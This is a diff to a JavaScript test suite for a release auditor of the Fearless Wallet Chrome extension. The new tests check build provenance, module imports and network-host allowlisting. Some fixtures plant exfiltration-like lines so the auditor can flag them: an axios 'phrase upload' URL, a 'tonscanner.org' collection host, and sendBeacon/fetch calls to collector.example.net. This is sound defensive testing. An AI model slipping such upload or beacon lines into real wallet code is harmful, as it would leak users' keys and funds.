@@ -15,12 +15,19 @@ import {
   EXPECTED_CHROME_EXTENSION_ID,
   REQUIRED_PUBLIC_CONFIG_KEYS,
 } from './audit-chrome-release.mjs';
+import { readReleaseTransferFlags, TRANSFER_EVIDENCE_MANIFESTS } from './release-transfer-flags.mjs';
+
+const repositoryRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
+const RELEASE_TRANSFER_FLAGS = readReleaseTransferFlags(repositoryRoot);
 
 const TEST_PUBLIC_KEY =
   'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1/GrfVJTMm3BhHOSkdgMWyd2KR7DtyEwOXKxDetfPP6c9ZLXN8EdmOlhIVK5AOr14mY2Rdf/mtyFA0VgwyWl1P8OZiKs1gtn1TPm7wvGpd4ccwIaWQlh+8vIaaG2/bRPc3GtK8WeUT97eSYRTgC7XeFqlP4oHYm3gnqwzKGBQ0tS2cG3scrUuq7OhxXV8GNwDFwVgW3rnBm9KhwP8MpbDBXuapS/0f+4dzp576BjHNuO+EbaLrhYzIE2OwXb0s+w5cO6NVqpjSjpldnZPiicGQzJwyPMfUGclcoj/lUQRF/JtYg5lAiYU6qsh0eiiWn8tsc7f6zJh/Wj1DI0gae0vQIDAQAB';
 const WRONG_PUBLIC_KEY =
   'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj/u/XDdjlDyw7gHEtaaasZ9GdG8WOKAyJzXd8HFrDtz2Jcuy7er7MtWvHgNDA0bwpznbI5YdZeV4UfCEsA4SrA5b3MnWTHwA1bgbiDM+L9rrqvcadcKuOlTeN48Q0ijmhHlNFbTzvT9W0zw/GKv8LgXAHggxtmHQ/Z9PP2QNF5O8rUHHSL4AJ6hNcEKSBVSmbbjeVm4gSXDuED5r0nwxvRtupDxGYp8IZpP5KlExqNu1nbkPc+igCTIB6XsqijagzxewUHCdovmkb2JNtskx/PMIEv+TvWIx2BzqGp71gSh/dV7SJ3rClvWd2xj8dtxG8FfAWDTIIi0qZXWn2QhizQIDAQAB';
 const ZIP_NAME = 'fearless-wallet-extension-chrome.zip';
+const FIXTURE_SOURCE_COMMIT = '0123456789abcdef0123456789abcdef01234567';
+const FIXTURE_YARN_LOCK = '__metadata:\n  version: 10\n  cacheKey: 10\n';
+const FIXTURE_YARN_LOCK_SHA256 = createHash('sha256').update(FIXTURE_YARN_LOCK).digest('hex');
 const TEST_RELEASE_ENVIRONMENT = Object.fromEntries(
   REQUIRED_PUBLIC_CONFIG_KEYS.map((key) => [
     key,
@@ -85,7 +92,7 @@ function baseManifest() {
       extension_pages:
         "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'self'; style-src 'unsafe-inline'; img-src 'self' https: data:; frame-src https:; frame-ancestors https:; connect-src https: wss: ws:; media-src https:",
     },
-    description: 'Non-custodial multichain wallet for Polkadot, Ethereum, TON, Bitcoin, Solana, and SORA ecosystems.',
+    description: 'Manage crypto accounts, view balances, and connect to compatible decentralized apps.',
     homepage_url: 'https://fearlesswallet.io/',
     host_permissions: ['<all_urls>'],
     icons: {
@@ -105,14 +112,14 @@ function baseManifest() {
     },
     permissions: ['storage', 'tabs', 'identity', 'clipboardRead', 'alarms'],
     short_name: 'FW',
-    version: '3.0.6',
+    version: '4.2.0',
     web_accessible_resources: [
       { matches: ['https://*/*', 'http://*/*', 'http://localhost/*'], resources: ['page.js'] },
     ],
   };
 }
 
-function baseFiles(manifest) {
+function baseFiles(manifest, metadataOverrides = {}) {
   const compiledReleaseEnvironment = Object.values(TEST_RELEASE_ENVIRONMENT).join('|');
   const files = new Map([
     ['manifest.json', Buffer.from(`${JSON.stringify(manifest, null, 2)}\n`)],
@@ -124,12 +131,18 @@ function baseFiles(manifest) {
             browser: 'chrome',
             mode: 'production',
             releaseFlags: {
-              VUE_APP_ENABLE_BITCOIN_TRANSFERS: 'false',
-              VUE_APP_ENABLE_IROHA_TRANSFERS: 'false',
+              ...RELEASE_TRANSFER_FLAGS,
+              VUE_APP_ENABLE_IROHA_CONNECT: 'false',
+              VUE_APP_ENABLE_SOLANA_TRANSFERS: 'true',
               VUE_APP_EXTENSION_SMOKE: 'false',
+              VUE_APP_PORTFOLIO_DASHBOARD: 'true',
               VUE_APP_TEST_ONLY: 'false',
             },
-            schemaVersion: 1,
+            schemaVersion: 2,
+            sourceCommit: FIXTURE_SOURCE_COMMIT,
+            sourceDirty: false,
+            yarnLockSha256: FIXTURE_YARN_LOCK_SHA256,
+            ...metadataOverrides,
           },
           null,
           2
@@ -225,8 +238,14 @@ async function createFixture(tempRoot, label, options = {}) {
     path.join(rootDir, 'package.json'),
     `${JSON.stringify({ description: manifest.description, name: 'fixture', version: packageVersion }, null, 2)}\n`
   );
+  for (const manifestPath of Object.values(TRANSFER_EVIDENCE_MANIFESTS)) {
+    await fs.mkdir(path.dirname(path.join(rootDir, manifestPath)), { recursive: true });
+    await fs.copyFile(path.join(repositoryRoot, manifestPath), path.join(rootDir, manifestPath));
+  }
+  await fs.writeFile(path.join(rootDir, 'yarn.lock'), FIXTURE_YARN_LOCK);
+  const sourceMetadata = (await options.beforeArtifact?.(rootDir)) ?? {};
 
-  const files = baseFiles(manifest);
+  const files = baseFiles(manifest, { ...sourceMetadata, ...options.metadata });
   for (const name of options.removeFiles ?? []) files.delete(name);
   for (const [name, content] of options.extraFiles ?? []) files.set(name, Buffer.from(content));
   options.mutateFiles?.(files);
@@ -239,10 +258,33 @@ async function createFixture(tempRoot, label, options = {}) {
   return { distDir, rootDir, zipPath };
 }
 
+function git(rootDir, ...args) {
+  const result = spawnSync(
+    'git',
+    ['-C', rootDir, '-c', 'user.name=Fixture', '-c', 'user.email=fixture@example.invalid', ...args],
+    { encoding: 'utf8' }
+  );
+  if (result.status !== 0) throw new Error(`git ${args.join(' ')} failed: ${result.stderr}`);
+  return result.stdout.trim();
+}
+
+async function commitFixtureSource(rootDir) {
+  await fs.writeFile(path.join(rootDir, '.gitignore'), '/dist\n');
+  git(rootDir, 'init', '--quiet');
+  git(rootDir, 'add', '--all');
+  git(rootDir, 'commit', '--quiet', '--message', 'fixture source');
+  return { sourceCommit: git(rootDir, 'rev-parse', 'HEAD') };
+}
+
 let passed = 0;
 async function expectPass(tempRoot, label, options = {}, auditOptions = {}) {
   const fixture = await createFixture(tempRoot, label, options);
-  await auditChromeRelease({ ...fixture, expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256, ...auditOptions });
+  await auditChromeRelease({
+    ...fixture,
+    expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+    expectedSourceCommit: FIXTURE_SOURCE_COMMIT,
+    ...auditOptions,
+  });
   passed += 1;
   return fixture;
 }
@@ -253,6 +295,7 @@ async function expectFailure(tempRoot, label, options, expected, auditOptions = 
     await auditChromeRelease({
       ...fixture,
       expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+      expectedSourceCommit: FIXTURE_SOURCE_COMMIT,
       ...auditOptions,
     });
   } catch (error) {
@@ -272,6 +315,18 @@ async function run() {
     passed += 1;
 
     const clean = await expectPass(tempRoot, 'clean-release', {}, { release: true });
+    await expectFailure(
+      tempRoot,
+      'secret-upload-in-nested-chunk',
+      { extraFiles: [['chunks/legacy.js', 'service.fetchJettonInfo();']] },
+      /Chrome directory artifact: known key-exfiltration indicator/u
+    );
+    await expectFailure(
+      tempRoot,
+      'secret-upload-only-in-archive',
+      { mutateZipEntries: (entries) => [...entries, { name: 'chunks/legacy.js', data: Buffer.from('"https://tonscanner.org"') }] },
+      /Chrome ZIP artifact: known key-exfiltration indicator/u
+    );
     const cli = spawnSync(
       process.execPath,
       [auditScript, '--root', clean.rootDir, '--dist', clean.distDir, '--zip', clean.zipPath],
@@ -379,16 +434,180 @@ async function run() {
         releaseEnvironment: { ...TEST_RELEASE_ENVIRONMENT, FL_WEB_TON_API_KEY: 'not-in-runtime' },
       }
     );
+    await expectPass(tempRoot, 'release-config-in-static-worker-runtime', {
+      mutateFiles(files) {
+        files.set('background-runtime.js', files.get('background.js'));
+        files.set('background.js', Buffer.from('import*as runtime from "./background-runtime.js"; globalThis.runtime = runtime;'));
+      },
+    }, { release: true });
+    await expectPass(tempRoot, 'release-config-in-nested-reexport-cycle', {
+      mutateFiles(files) {
+        const runtime = files.get('background.js');
+        files.set('background.js', Buffer.from('export { background } from "./chunks/bridge.js";'));
+        files.set('chunks/bridge.js', Buffer.from('export * from "../background-runtime.js";'));
+        files.set('background-runtime.js', Buffer.concat([runtime, Buffer.from('import "./background.js";')]));
+      },
+    }, { release: true });
+    for (const source of ['import("./chunks/runtime.js");', 'import(`./chunks/runtime.js`);']) {
+      await expectPass(tempRoot, 'release-config-in-literal-lazy-popup-runtime', {
+        mutateFiles(files) {
+          files.set('chunks/runtime.js', files.get('background.js'));
+          files.set('background.js', Buffer.from('export const background = true;'));
+          files.set('popup.js', Buffer.from(source));
+        },
+      }, { release: true });
+    }
+    for (const source of [
+      '// import "./decoy.js";\nexport const background = true;',
+      'export const background = \'import "./decoy.js";\';',
+      'export const background = \'import("./decoy.js");\';',
+      'const file = "./decoy.js"; import(file);',
+      'const file = "decoy.js"; import(`./${file}`);',
+    ]) {
+      await expectFailure(tempRoot, 'release-config-in-fake-import-decoy', {
+        mutateFiles(files) {
+          files.set('decoy.js', files.get('background.js'));
+          files.set('background.js', Buffer.from(source));
+        },
+      }, /OAuth client_id is not compiled into a reviewed entrypoint or popup preload/u, { release: true });
+    }
+    await expectFailure(tempRoot, 'release-missing-static-dependency', {
+      mutateFiles: (files) => files.set('background.js', Buffer.from('import "./missing-runtime.js";')),
+    }, /references missing reviewed JavaScript missing-runtime\.js/u, { release: true });
+    await expectFailure(tempRoot, 'release-static-dependency-traversal', {
+      mutateFiles: (files) => files.set('background.js', Buffer.from('import "../outside.js";')),
+    }, /dependency traverses or has an empty path segment/u, { release: true });
+    await expectFailure(tempRoot, 'release-remote-static-dependency', {
+      mutateFiles: (files) => files.set('background.js', Buffer.from('import "https://example.com/runtime.js";')),
+    }, /must use a local JavaScript module specifier/u, { release: true });
+    await expectFailure(tempRoot, 'release-malformed-static-dependency', {
+      mutateFiles: (files) => files.set('background.js', Buffer.from('import { from "./background-runtime.js";')),
+    }, /cannot parse reviewed JavaScript background\.js/u, { release: true });
+    await expectFailure(
+      tempRoot,
+      'release-stale-source-commit',
+      { metadata: { sourceCommit: 'f9e6ec55'.padEnd(40, '0') } },
+      /built from source commit f9e6ec550{32}, not the release source commit 0123456789abcdef/u,
+      { release: true }
+    );
+    await expectFailure(
+      tempRoot,
+      'release-dirty-source',
+      { metadata: { sourceDirty: true } },
+      /was built from a dirty source tree/u,
+      { release: true }
+    );
+    await expectPass(tempRoot, 'non-release-dirty-source', { metadata: { sourceDirty: true } });
+    await expectFailure(
+      tempRoot,
+      'release-unknown-source',
+      { metadata: { sourceCommit: null, sourceDirty: null } },
+      /built from source commit unknown, not the release source commit/u,
+      { release: true }
+    );
+    await expectPass(tempRoot, 'non-release-source-archive-build', {
+      metadata: { sourceCommit: null, sourceDirty: null },
+    });
+    await expectFailure(
+      tempRoot,
+      'release-different-yarn-lock',
+      { metadata: { yarnLockSha256: createHash('sha256').update('other lockfile').digest('hex') } },
+      /built with a yarn\.lock that differs from the release source/u,
+      { release: true }
+    );
+    await expectFailure(
+      tempRoot,
+      'pre-provenance-metadata',
+      {
+        mutateFiles(files) {
+          const metadata = JSON.parse(files.get('extension-build-metadata.json').toString('utf8'));
+          delete metadata.sourceCommit;
+          delete metadata.sourceDirty;
+          delete metadata.yarnLockSha256;
+          metadata.schemaVersion = 1;
+          files.set('extension-build-metadata.json', Buffer.from(`${JSON.stringify(metadata)}\n`));
+        },
+      },
+      /extension build metadata keys differ from the reviewed allowlist/u
+    );
+    await expectFailure(
+      tempRoot,
+      'stale-metadata-schema',
+      { metadata: { schemaVersion: 1 } },
+      /extension build metadata schemaVersion must be 2/u
+    );
+    await expectFailure(
+      tempRoot,
+      'abbreviated-source-commit',
+      { metadata: { sourceCommit: '5001b466' } },
+      /sourceCommit must be a full Git commit SHA or null/u
+    );
+    await expectFailure(
+      tempRoot,
+      'source-commit-without-dirty-state',
+      { metadata: { sourceDirty: null } },
+      /sourceDirty must be a boolean for a Git build and null otherwise/u
+    );
+    await expectFailure(
+      tempRoot,
+      'malformed-yarn-lock-digest',
+      { metadata: { yarnLockSha256: 'not-a-digest' } },
+      /yarnLockSha256 must be a SHA-256 digest/u
+    );
+
+    const gitRelease = await expectPass(
+      tempRoot,
+      'release-git-head',
+      { beforeArtifact: commitFixtureSource },
+      { release: true, expectedSourceCommit: undefined }
+    );
+    await fs.writeFile(path.join(gitRelease.rootDir, 'later-change.txt'), 'reviewed later\n');
+    git(gitRelease.rootDir, 'add', 'later-change.txt');
+    git(gitRelease.rootDir, 'commit', '--quiet', '--message', 'later commit');
+    try {
+      await auditChromeRelease({
+        ...gitRelease,
+        expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+        release: true,
+      });
+      throw new Error('release-git-moved-head: audit unexpectedly passed');
+    } catch (error) {
+      if (!/not the release source commit/u.test(error.message)) throw error;
+      passed += 1;
+    }
+    await expectFailure(
+      tempRoot,
+      'release-outside-git',
+      {},
+      /release mode cannot determine the source commit|requires .* to be the root of its own Git checkout/u,
+      { release: true, expectedSourceCommit: undefined }
+    );
+    const nestedRoot = path.join(gitRelease.rootDir, 'nested-source');
+    await fs.mkdir(nestedRoot);
+    await fs.copyFile(path.join(gitRelease.rootDir, 'package.json'), path.join(nestedRoot, 'package.json'));
+    await fs.copyFile(path.join(gitRelease.rootDir, 'yarn.lock'), path.join(nestedRoot, 'yarn.lock'));
+    try {
+      await auditChromeRelease({
+        ...gitRelease,
+        rootDir: nestedRoot,
+        expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+        release: true,
+      });
+      throw new Error('release-nested-in-foreign-checkout: audit unexpectedly passed');
+    } catch (error) {
+      if (!/requires .*nested-source to be the root of its own Git checkout/u.test(error.message)) throw error;
+      passed += 1;
+    }
     await expectFailure(
       tempRoot,
       'published-version',
-      { mutateManifest: (manifest) => (manifest.version = '3.0.5') },
-      /must be greater than published version 3\.0\.5/u
+      { mutateManifest: (manifest) => (manifest.version = '3.0.9') },
+      /must be greater than published version 3\.0\.9/u
     );
     await expectFailure(
       tempRoot,
       'package-version-mismatch',
-      { packageVersion: '3.0.7' },
+      { packageVersion: '3.0.8' },
       /does not match package\.json/u
     );
     await expectFailure(
@@ -509,6 +728,39 @@ async function run() {
       /homepage_url must be https:\/\/fearlesswallet\.io\//u
     );
     await expectFailure(tempRoot, 'missing-page', { removeFiles: ['page.js'] }, /missing required file page\.js/u);
+    // The 3.0.x phrase upload and any unreviewed host fail every build, release or not.
+    await expectPass(tempRoot, 'listed-host', {
+      extraFiles: [['chunks/ton.js', 'fetch("https://ti.soramitsu.io/api/indexer/v1/accounts")\n']],
+    });
+    await expectFailure(
+      tempRoot,
+      'phrase-upload-path',
+      { extraFiles: [['chunks/balance.js', 'axios.get(`${ton}/whitelist?address=${address.join(";")}`)\n']] },
+      /Chrome directory artifact: known key-exfiltration indicator .* in chunks\/balance\.js/u
+    );
+    await expectFailure(
+      tempRoot,
+      'collection-host',
+      { extraFiles: [['assets/data.json', '{"ton":"https://tonscanner.org"}\n']] },
+      /known key-exfiltration indicator .* in assets\/data\.json/u
+    );
+    await expectFailure(
+      tempRoot,
+      'unlisted-host',
+      { extraFiles: [['chunks/beacon.js', 'navigator.sendBeacon("https://collector.example.net/c")\n']] },
+      /names network hosts outside scripts\/release-network-hosts\.json: collector\.example\.net \(chunks\/beacon\.js\)/u
+    );
+    await expectFailure(
+      tempRoot,
+      'zip-only-host',
+      {
+        mutateZipEntries: (entries) =>
+          entries.map((entry) =>
+            entry.name === 'popup.js' ? { ...entry, data: Buffer.from('fetch("https://collector.example.net")\n') } : entry
+          ),
+      },
+      /Chrome ZIP artifact names network hosts outside/u
+    );
     await expectFailure(
       tempRoot,
       'wrong-icon-size',
@@ -547,6 +799,16 @@ async function run() {
       },
       /release flag VUE_APP_TEST_ONLY must be false/u
     );
+    for (const [index, buildPath] of [
+      'file:///Users/someone/dev/wallet/',
+      'file:///home/someone/wallet/',
+      'file:///private/var/folders/xy/T/wallet/',
+      'file:///private/tmp/codex/scratchpad/build/',
+    ].entries()) {
+      await expectFailure(tempRoot, `private-build-path-${index}`, {
+        extraFiles: [['chunks/path.js', `const path = new URL(${JSON.stringify(buildPath + 'packageInfo.js')}).pathname;`]],
+      }, /embeds a private build path/u);
+    }
     await expectFailure(
       tempRoot,
       'inline-source-map',
